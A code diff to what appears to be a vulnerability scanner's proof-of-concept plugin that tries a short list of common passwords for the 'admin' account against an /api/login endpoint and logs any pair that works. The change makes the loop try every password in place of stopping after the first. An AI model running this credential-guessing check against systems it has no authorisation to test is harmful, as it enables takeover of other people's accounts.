@@ -21,19 +21,26 @@ POST /api/login
 @Expected Response
     not 401
 '''
+import json
 
 from lib.utils.http import request_ex, get_http_url, urljoin_ex
 from lib.utils.dic import Wordlist
+from lib.core.data import logger as log
 
 
 def poc(url):
     url = urljoin_ex(url, "/api/login")
+
     for pwd in Wordlist.top_10_pass:
-        resp = request_ex("post", url, json={"username": "admin", "password": pwd})
+        post_data = {"username": "admin", "password": pwd}
+        resp = request_ex("post", url=url, json=post_data, timeout=8)
         if resp and resp.status_code != 401:
+            msg = "%s\t %s" % (url, json.dumps(post_data))
+            log.success(msg)
             return True
         else:
-            break
+            continue
+
     # finally
     return False
 
